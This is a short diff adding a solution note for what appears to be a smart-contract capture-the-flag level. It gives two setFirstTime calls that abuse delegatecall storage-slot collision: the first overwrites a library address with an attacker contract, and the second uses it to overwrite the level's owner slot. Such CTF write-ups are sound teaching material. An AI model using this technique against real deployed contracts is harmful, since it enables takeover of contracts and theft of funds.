@@ -1,0 +1,10 @@
+Solution:
+Call to overwrite variable in slot 0 timeZone1Library:
+await contract.setFirstTime("address of Hack contract")
+Call 2:
+await contract.setFirstTime(any_value)
+
+Other Notes:
+-reminder, msg.sender on delegatecall is that of original sender.
+-on delegatecall in Call 2, you may overwrite slot 2 in the hack contract,
+which overwrites slot 2 in Level.
